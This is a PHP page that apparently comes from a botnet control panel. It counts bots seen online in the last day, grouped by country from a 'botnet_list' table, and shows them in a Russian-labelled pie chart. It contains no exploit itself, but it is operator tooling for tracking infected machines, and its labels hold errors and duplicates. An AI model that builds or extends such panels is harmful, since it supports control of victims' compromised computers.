<?php
error_reporting(0);
include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
$time = substr(microtime(), 11);
$online_time = $time - 86400;
$online_query = "SELECT country FROM `botnet_list` WHERE `rtime_last`>='$online_time'";
$query_go = mysql_query($online_query);
while ( $result = mysql_fetch_row($query_go))
		    {
			    $country[] = $result[0];			
			}
  $US_pre = array_keys( $country, "US");
		 $us = count($US_pre);
         $IN_pre = array_keys( $country, "IN");
		 $in = count($IN_pre);
		 $EG_pre = array_keys( $country, "EG");
		 $eg = count($EG_pre);
		 $ID_pre = array_keys( $country, "ID");
		 $id = count($ID_pre);
		 $UA_pre = array_keys( $country, "UA");
		 $ua = count($UA_pre);
		 $TH_pre = array_keys( $country, "TH");
		 $th = count($TH_pre);
		 $VN_pre = array_keys( $country, "VN");
		 $vn = count($VN_pre);
		 $PK_pre = array_keys( $country, "PK");
		 $pk = count($PK_pre);
		 $RU_pre = array_keys( $country, "RU");
		 $ru = count($RU_pre);
		 $TR_pre = array_keys( $country, "TR");
		 $tr = count($TR_pre);
		 $BY_pre = array_keys( $country, "BY");
		 $by = count($BY_pre);
		 $IR_pre = array_keys( $country, "IR");
		 $ir = count($IR_pre);
		 $NG_pre = array_keys( $country, "NG");
		 $ng = count($NG_pre);
		 $PL_pre = array_keys( $country, "PL");
		 $pl = count($PL_pre);
		 $PH_pre = array_keys( $country, "PH");
		 $ph = count($PH_pre);
		 $BD_pre = array_keys( $country, "BD");
		 $bd = count($BD_pre);
		 $BR_pre = array_keys( $country, "BR");
		 $br = count($BR_pre);
		 $DZ_pre = array_keys( $country, "DZ");
		 $dz = count($DZ_pre);
		 $PS_pre = array_keys( $country, "PS");
		 $ps = count($PS_pre);
		 $ZA_pre = array_keys( $country, "ZA");
		 $za = count($ZA_pre);
		 $AE_pre = array_keys( $country, "AE");
		 $ae = count($AE_pre);
		 $CN_pre = array_keys( $country, "CN");
		 $cn = count($CN_pre);
         $DE_pre = array_keys( $country, "DE");
		 $de = count($DE_pre);
		 $KR_pre = array_keys( $country, "KR");
		 $kr = count($KR_pre);
		 $MD_pre = array_keys( $country, "MD");
		 $md = count($MD_pre);
		 $NP_pre = array_keys( $country, "NP");
		 $np = count($NP_pre);
		 $SD_pre = array_keys( $country, "SD");
		 $sd = count($SD_pre);
		 $AR_pre = array_keys( $country, "AR");
		 $ar = count($AR_pre);
		 $DO_pre = array_keys( $country, "DO");
		 $do = count($DO_pre);
		 $EC_pre = array_keys( $country, "EC");
		 $ec = count($EC_pre);
		 $ET_pre = array_keys( $country, "ET");
		 $et = count($ET_pre);
		 $JO_pre = array_keys( $country, "JO");
		 $jo = count($JO_pre);
		 $LK_pre = array_keys( $country, "LK");
		 $lk = count($LK_pre);
		 $MA_pre = array_keys( $country, "MA");
		 $ma = count($MA_pre);
		 $MN_pre = array_keys( $country, "MN");
		 $mn = count($MN_pre);
		 $MX_pre = array_keys( $country, "MX");
		 $mx = count($MX_pre);
		 $MY_pre = array_keys( $country, "MY");
		 $my = count($MY_pre);
		 $AF_pre = array_keys( $country, "AF");
		 $af = count($AF_pre);
		 $BF_pre = array_keys( $country, "BF");
		 $bf = count($BF_pre);
		 $BG_pre = array_keys( $country, "BG");
		 $bg = count($BG_pre);
		 $CA_pre = array_keys( $country, "CA");
		 $ca = count($CA_pre);
		 $CI_pre = array_keys( $country, "CI");
		 $ci = count($CI_pre);
		 $DJ_pre = array_keys( $country, "DJ");
		 $dj = count($DJ_pre);
		 $UA_pre = array_keys( $country, "UA");
		 $ua = count($UA_pre);
		 $GH_pre = array_keys( $country, "GH");
		 $gh = count($GH_pre);
		 $GT_pre = array_keys( $country, "GT");
		 $gt = count($GT_pre);	 
		 $HK_pre = array_keys( $country, "HK");
		 $hk = count($HK_pre);
		 $IL_pre = array_keys( $country, "IL");
		 $il = count($IL_pre);
		 $IQ_pre = array_keys( $country, "IQ");
		 $iq = count($IQ_pre);
		 $JM_pre = array_keys( $country, "JM");
		 $jm = count($JM_pre);
		 $JP_pre = array_keys( $country, "JP");
		 $jp = count($JP_pre);
		 $KE_pre = array_keys( $country, "KE");
		 $ke = count($KE_pre);
		 $KH_pre = array_keys( $country, "KH");
		 $kh = count($KH_pre);
		 $KW_pre = array_keys( $country, "KW");
		 $kw = count($KW_pre);
		 $MM_pre = array_keys( $country, "MM");
		 $mm = count($MM_pre);
		 $MV_pre = array_keys( $country, "MV");
		 $mv = count($MV_pre);
		 $PE_pre = array_keys( $country, "PE");
		 $pe = count($PE_pre);
		 $PT_pre = array_keys( $country, "PT");
		 $pt = count($PT_pre);
		 $SE_pre = array_keys( $country, "SE");
		 $se = count($SE_pre);
		 $SN_pre = array_keys( $country, "SN");
		 $sn = count($SN_pre);
		 $SY_pre = array_keys( $country, "SY");
		 $sy = count($SY_pre);
		 $TG_pre = array_keys( $country, "TG");
		 $tg = count($TG_pre);
		 $TT_pre = array_keys( $country, "TT");
		 $tt = count($TT_pre);
		 $TZ_pre = array_keys( $country, "TZ");
		 $tz = count($TZ_pre);
		 $UG_pre = array_keys( $country, "UG");
		 $ug = count($UG_pre);
		 $UZ_pre = array_keys( $country, "UZ");
		 $uz = count($UZ_pre);
		 $VE_pre = array_keys( $country, "VE");
		 $ve = count($VE_pre);
		 $OS_pre = array_keys( $country, "--");
		 $os = count($OS_pre);
?>
<html>
    
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" >
        <title>vcxv</title>
        <link rel="stylesheet" href="style.css" type="text/css">
        <script src="../amcharts/amcharts.js" type="text/javascript"></script>  	
        <script type="text/javascript">
             var chart;

            var chartData = [{
                country: "США",
                visits: "<?php echo $us; ?>"
            }, {
                country: "Египт",
                visits: <?php echo $eg; ?>
            }, {
                country: "Индонезия",
                visits: <?php echo $id; ?>
            }, {
                country: "Тайланд",
                visits: <?php echo $th; ?>
            }, {
                country: "Вьетнам",
                visits: <?php echo $vn; ?>
            }, {
                country: "Пакистан",
                visits: <?php echo $pk; ?>
            }, {
                country: "Индия",
                visits: <?php echo $in; ?>
            }, {
                country: "Россия",
                visits: <?php echo $ru; ?>
            }, {
                country: "Украина",
                visits: <?php echo $ua; ?>
            }, {
                country: "Турция",
                visits: <?php echo $tr; ?>
            }, {
                country: "Беларусь",
                visits: <?php echo $by; ?>
            }, {
                country: "Иран",
                visits: <?php echo $ir; ?>
            },  {
                country: "Нигерия",
                visits: <?php echo $ng; ?>
            },  {
                country: "Польша",
                visits: <?php echo $pl; ?>
            },  {
                country: "Филиппины",
                visits: <?php echo $ph; ?>
            },  {
                country: "Бангладеш",
                visits: <?php echo $bd; ?>
            },  {
                country: "Бразилия",
                visits: <?php echo $br; ?>
            },  {
                country: "Алжир",
                visits: <?php echo $dz; ?>
            },  {
                country: "Палестина",
                visits: <?php echo $ps; ?>
            },  {
                country: "ЮАР",
                visits: <?php echo $za; ?>
            },  {
                country: "Эмираты",
                visits: <?php echo $ae; ?>
            },  {
                country: "Китай",
                visits: <?php echo $cn; ?>
            },  {
                country: "Германия",
                visits: <?php echo $de; ?>
            },  {
                country: "Корея",
                visits: <?php echo $kr; ?>
            },  {
                country: "Молдавия",
                visits: <?php echo $md; ?>
            },  {
                country: "Непал",
                visits: <?php echo $np; ?>
            }, {
                country: "Судан",
                visits: <?php echo $sd; ?>
            }, {
                country: "Аргентина",
                visits: <?php echo $ar; ?>
            }, {
                country: "Доминикан",
                visits: <?php echo $do; ?>
            }, {
                country: "Эквадор",
                visits: <?php echo $ec; ?>
            }, {
                country: "Эфиопия",
                visits: <?php echo $et; ?>
            }, {
                country: "Иордания",
                visits: <?php echo $jo; ?>
            }, {
                country: "Шри-Ланка",
                visits: <?php echo $lk; ?>
            }, {
                country: "Марокко",
                visits: <?php echo $ma; ?>
            }, {
                country: "Монголия",
                visits: <?php echo $mn; ?>
            }, {
                country: "Мексика",
                visits: <?php echo $mx; ?>
            }, {
                country: "Малайзия",
                visits: <?php echo $my; ?>
            }, {
                country: "Афганистан",
                visits: <?php echo $af; ?>
            }, {
                country: "Буркина-Фасо",
                visits: <?php echo $bf; ?>
            }, {
                country: "Болгария",
                visits: <?php echo $bg; ?>
            }, {
                country: "Канада",
                visits: <?php echo $ca; ?>
            }, {
                country: "Кот-д'Ивуар",
                visits: <?php echo $ci; ?>
            },  {
                country: "Джибути",
                visits: <?php echo $dj; ?>
            },  {
                country: "Украина",
                visits: <?php echo $ua; ?>
            },  {
                country: "Гана",
                visits: <?php echo $gh; ?>
            },  {
                country: "Гватемала",
                visits: <?php echo $gt; ?>
            },  {
                country: "Гонконг",
                visits: <?php echo $hk; ?>
            },  {
                country: "Израиль",
                visits: <?php echo $il; ?>
            },  {
                country: "Ирак",
                visits: <?php echo $iq; ?>
            },  {
                country: "Гватемала",
                visits: <?php echo $gt; ?>
            },  {
                country: "Ямайка",
                visits: <?php echo $jm; ?>
            },  {
                country: "Япония",
                visits: <?php echo $jp; ?>
            },  {
                country: "Кения",
                visits: <?php echo $ke; ?>
            },  {
                country: "Камбоджа",
                visits: <?php echo $kh; ?>
            },  {
                country: "Кувейт",
                visits: <?php echo $kw; ?>
            },  {
                country: "Мьянма",
                visits: <?php echo $mm; ?>
            },  {
                country: "Мальдивы",
                visits: <?php echo $mv; ?>
            },  {
                country: "Перу",
                visits: <?php echo $pe; ?>
            },  {
                country: "Португалия",
                visits: <?php echo $pt; ?>
            },  {
                country: "Швейцария",
                visits: <?php echo $se; ?>
            },  {
                country: "Сенегал",
                visits: <?php echo $sn; ?>
            },  {
                country: "Сирия",
                visits: <?php echo $sy; ?>
            },  {
                country: "Того",
                visits: <?php echo $tg; ?>
            },  {
                country: "Тринидад",
                visits: <?php echo $tt; ?>
            },  {
                country: "Тандазия",
                visits: <?php echo $tz; ?>
            },  {
                country: "Уганда",
                visits: <?php echo $ug; ?>
            },  {
                country: "Узбекистан",
                visits: <?php echo $uz; ?>
            },  {
                country: "Венесуэла",
                visits: <?php echo $ve; ?>
            }, {
                country: "Остальные",
                visits: <?php echo $os; ?>
            }
            
			];


            AmCharts.ready(function () {
                // PIE CHART
                chart = new AmCharts.AmPieChart();

                // title of the chart
                //chart.addTitle("Visitors countries", 16);

                chart.dataProvider = chartData;
                chart.titleField = "country";
                chart.valueField = "visits";
                chart.sequencedAnimation = true;
                chart.startEffect = "elastic";
                chart.innerRadius = "30%";
                chart.startDuration = 2;
                chart.labelRadius = 15;

                // the following two lines makes the chart 3D
                chart.depth3D = 10;
                chart.angle = 15;

                // WRITE                                 
                chart.write("chartdiv");
            });
     </script>
     <html>
    <style>
BODY {overflow: hidden}
</style>
    </head>
      <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
        <title>Chart [Online]</title>
    <body>
        <div id="chartdiv" style="width:580px; height:510px;"></div>
	
    </body>

</html>
